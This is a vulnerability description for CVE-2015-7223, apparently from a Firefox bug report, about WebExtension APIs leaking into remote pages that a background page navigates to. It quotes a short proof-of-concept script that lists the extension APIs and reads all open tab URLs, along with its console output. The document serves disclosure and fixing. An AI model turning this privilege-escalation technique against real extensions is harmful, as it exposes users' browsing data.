CVE-2015-7223.description:
We don't currently check that a document belongs to our extension before injecting APIs into it. In the case of background pages, we also continue injecting APIs into new window globals even after the first load. This means that if a background page navigates to a remote web page, that page has the full privileges of the extension. The attached testcase has a background page which navigates to https://people.mozilla.org/~kmaglione/webext-privilege-escalation.html, which contains this code: dump(`WEBEXT-PRIVILEGE-ESCALATION.HTML
`); dump(`WEBEXT-PRIVILEGE-ESCALATION.HTML: window.browser: ${window.browser && Object.keys(window.browser).sort()}
`); browser.tabs.query({}, tabs => { dump(`WEBEXT-PRIVILEGE-ESCALATION.HTML: Tab urls: ${Array.from(tabs, t => t.url).join(" ")}
`); }); And results in this console output: WEBEXT-PRIVILEGE-ESCALATION.HTML WEBEXT-PRIVILEGE-ESCALATION.HTML: window.browser: alarms,browserAction,extension,i18n,pageAction,runtime,tabs,test,windows WEBEXT-PRIVILEGE-ESCALATION.HTML: Tab urls: about:home about:addons
